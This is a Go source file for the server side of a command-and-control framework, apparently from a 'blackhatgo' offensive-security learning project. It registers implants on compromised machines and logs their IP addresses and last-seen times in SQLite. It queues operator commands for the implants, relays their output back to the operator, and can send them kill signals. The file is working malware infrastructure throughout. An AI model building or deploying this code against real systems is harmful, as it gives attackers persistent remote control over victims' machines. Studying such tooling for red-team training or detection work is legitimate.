package server

import (
	"blackhatgo/c2c/api"
	"blackhatgo/c2c/storage"
	"context"
	"database/sql"
	"errors"
	"log"
	"time"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

type sessionManager struct {
	work    map[string]chan *api.Command
	results map[string]chan *api.Command
}

type implantServer struct {
	api.UnimplementedImplantServer
	sessions *sessionManager
	implants map[uuid.UUID]time.Time
	db       *sql.DB
}

type adminServer struct {
	api.UnimplementedAdminServer
	sessions *sessionManager
	implants map[uuid.UUID]time.Time
	db       *sql.DB
}

func NewSessionManager(work, results map[string]chan *api.Command) *sessionManager {
	return &sessionManager{
		work:    work,
		results: results,
	}
}

func NewImplantServer(sessions *sessionManager, implants map[uuid.UUID]time.Time, db *sql.DB) *implantServer {
	s := new(implantServer)
	s.sessions = sessions
	s.implants = implants
	s.db = db
	return s
}

func NewAdminServer(sessions *sessionManager, implants map[uuid.UUID]time.Time, db *sql.DB) *adminServer {
	s := new(adminServer)
	s.sessions = sessions
	s.implants = implants
	s.db = db
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *api.Empty) (*api.Command, error) {
	md, ok := metadata.FromIncomingContext(ctx)
	if !ok {
		return nil, status.Error(codes.Unauthenticated, "no metadata provided")
	}

	id := md["implant-id"][0]
	storage.UpdateLastSeen(s.db, id)

	var cmd = new(api.Command)
	select {
	case cmd, ok := <-s.sessions.work[id]:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// No work
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *api.Command) (*api.Empty, error) {
	md, ok := metadata.FromIncomingContext(ctx)
	if !ok {
		return nil, status.Error(codes.Unauthenticated, "no metadata provided")
	}

	id := md["implant-id"][0]

	s.sessions.results[id] <- result
	return &api.Empty{}, nil
}

func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *api.Empty) (*api.RegisterResponse, error) {
	ipAddress := getClientIP(ctx)

	implantId, err := uuid.NewUUID()
	if err != nil {
		return nil, err
	}
	s.implants[implantId] = time.Now()
	s.sessions.work[implantId.String()] = make(chan *api.Command)
	s.sessions.results[implantId.String()] = make(chan *api.Command)

	storage.InsertImplant(s.db, implantId, ipAddress, time.Now(), time.Now())

	response := api.RegisterResponse{
		Id: implantId.String(),
	}
	return &response, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *api.Command) (*api.Command, error) {
	var res *api.Command
	go func() {
		s.sessions.work[cmd.ImplantId] <- cmd
	}()
	res = <-s.sessions.results[cmd.ImplantId]
	return res, nil
}

func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *api.Empty) (*api.ImplantsList, error) {
	implants, err := storage.ListImplants(s.db)
	if err != nil {
		return nil, err
	}

	response := api.ImplantsList{}
	now := time.Now()

	// Threshold determines whether implant is online or offline
	threshold := 30 * time.Second

	for _, implant := range implants {
		status := "ONLINE"
		if now.Sub(implant.LastSeen) > threshold {
			status = "OFFLINE"
		}

		data := &api.ImplantData{
			Id:        implant.ID.String(),
			IpAddress: implant.IpAddress,
			LastSeen:  implant.LastSeen.String(),
			Status:    status,
		}
		response.Implants = append(response.Implants, data)
	}
	return &response, nil
}

func (s *adminServer) DeleteImplant(ctx context.Context, deleteRequest *api.DeleteRequest) (*api.Empty, error) {
	killCmd := &api.Command{
		IsKill: true,
	}

	select {
	case s.sessions.work[deleteRequest.Id] <- killCmd:
		log.Printf("[*] Sent kill signal to active implant %s", deleteRequest.Id)
	default:
		log.Printf("[!] Implant %s is offline. Skipping kill signal.", deleteRequest.Id)
	}

	err := storage.DeleteImplant(s.db, deleteRequest.Id)
	if err != nil {
		return nil, err
	}

	return &api.Empty{}, nil
}
